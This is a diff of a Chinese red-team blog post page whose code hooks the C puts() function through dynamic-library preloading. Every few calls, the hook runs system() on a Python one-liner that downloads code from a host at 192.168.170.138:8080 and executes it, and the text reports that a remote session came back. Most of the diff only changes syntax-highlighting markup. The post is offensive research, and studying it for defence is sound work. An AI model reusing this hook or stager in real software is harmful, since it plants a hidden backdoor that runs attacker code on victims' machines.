@@ -7,10 +7,10 @@
 </span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>puts</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>message) {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>new_puts)(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>message);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> result;
-</span></span><span style=display:flex><span>  new_puts <span style=color:#f92672>=</span> dlsym(RTLD_NEXT, <span style=color:#e6db74>&#34;puts&#34;</span>);
+</span></span><span style=display:flex><span>  new_puts <span style=color:#f92672>=</span> <span style=color:#a6e22e>dlsym</span>(RTLD_NEXT, <span style=color:#e6db74>&#34;puts&#34;</span>);
 </span></span><span style=display:flex><span><span style=color:#75715e>// do some thing …
 </span></span></span><span style=display:flex><span><span style=color:#75715e>// 这里是puts调用之前
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  result <span style=color:#f92672>=</span> new_puts(message);
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  result <span style=color:#f92672>=</span> <span style=color:#a6e22e>new_puts</span>(message);
 </span></span><span style=display:flex><span>  <span style=color:#75715e>// 这里是puts调用之后
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> result;
 </span></span><span style=display:flex><span>}
@@ -27,32 +27,32 @@
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> file_line <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buffer[BUFFER_SIZE];
 </span></span><span style=display:flex><span>	FILE <span style=color:#f92672>*</span>fp <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	fp <span style=color:#f92672>=</span> fopen(filename,<span style=color:#e6db74>&#34;r&#34;</span>);
+</span></span><span style=display:flex><span>	fp <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(filename,<span style=color:#e6db74>&#34;r&#34;</span>);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(fp<span style=color:#f92672>==</span>NULL){
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> file_line;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(fgets(buffer,BUFFER_SIZE,fp)<span style=color:#f92672>!=</span> NULL){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>while</span>(<span style=color:#a6e22e>fgets</span>(buffer,BUFFER_SIZE,fp)<span style=color:#f92672>!=</span> NULL){
 </span></span><span style=display:flex><span>		file_line <span style=color:#f92672>++</span>;
 </span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>	fclose(fp);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fclose</span>(fp);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> file_line;
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>add_file_line</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> filename){
 </span></span><span style=display:flex><span>	FILE <span style=color:#f92672>*</span> fp <span style=color:#f92672>=</span> NULL;
-</span></span><span style=display:flex><span>	fp <span style=color:#f92672>=</span> fopen(filename,<span style=color:#e6db74>&#34;a+&#34;</span>);
+</span></span><span style=display:flex><span>	fp <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(filename,<span style=color:#e6db74>&#34;a+&#34;</span>);
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(fp <span style=color:#f92672>==</span> NULL){
 </span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>;
 </span></span><span style=display:flex><span>	}
 </span></span><span style=display:flex><span>	
-</span></span><span style=display:flex><span>	fputs(<span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,fp);
-</span></span><span style=display:flex><span>	fclose(fp);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fputs</span>(<span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,fp);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fclose</span>(fp);
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>call_system</span>(){
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  system(<span style=color:#e6db74>&#34;python -c </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.170.138:8080/o1ZJy3Wue&#39;);exec(r.read());</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;python -c </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.170.138:8080/o1ZJy3Wue&#39;);exec(r.read());</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
@@ -61,16 +61,16 @@
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> (<span style=color:#f92672>*</span>new_puts)(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>message);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> result;
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> file_lines <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  new_puts <span style=color:#f92672>=</span> dlsym(RTLD_NEXT, <span style=color:#e6db74>&#34;puts&#34;</span>);
-</span></span><span style=display:flex><span>  add_file_line(filename);
-</span></span><span style=display:flex><span>  file_lines <span style=color:#f92672>=</span> check_file_line(filename);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[+]file_line : %d, NUM = %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,file_lines, COMMAND_NUM);
+</span></span><span style=display:flex><span>  new_puts <span style=color:#f92672>=</span> <span style=color:#a6e22e>dlsym</span>(RTLD_NEXT, <span style=color:#e6db74>&#34;puts&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>add_file_line</span>(filename);
+</span></span><span style=display:flex><span>  file_lines <span style=color:#f92672>=</span> <span style=color:#a6e22e>check_file_line</span>(filename);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+]file_line : %d, NUM = %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,file_lines, COMMAND_NUM);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(file_lines <span style=color:#f92672>%</span> COMMAND_NUM <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>){
-</span></span><span style=display:flex><span>  	call_system();
+</span></span><span style=display:flex><span>  	<span style=color:#a6e22e>call_system</span>();
 </span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  result <span style=color:#f92672>=</span> new_puts(message);
+</span></span><span style=display:flex><span>  result <span style=color:#f92672>=</span> <span style=color:#a6e22e>new_puts</span>(message);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> result;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7c9b8e1c-4f5f-11ec-be9d-00d861bf4abb.png alt=2020-01-03-13-10-13></p></p><p>在执行至第零次、五次时，成功返回了会话：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7cdacac8-4f5f-11ec-bdf0-00d861bf4abb.png alt=2020-01-03-13-10-21></p></p><p>COMMAND_NUM 可自定义</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
+</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7c9b8e1c-4f5f-11ec-be9d-00d861bf4abb.png alt=2020-01-03-13-10-13></p></p><p>在执行至第零次、五次时，成功返回了会话：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7cdacac8-4f5f-11ec-bdf0-00d861bf4abb.png alt=2020-01-03-13-10-21></p></p><p>COMMAND_NUM 可自定义</p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
 to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
 <script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
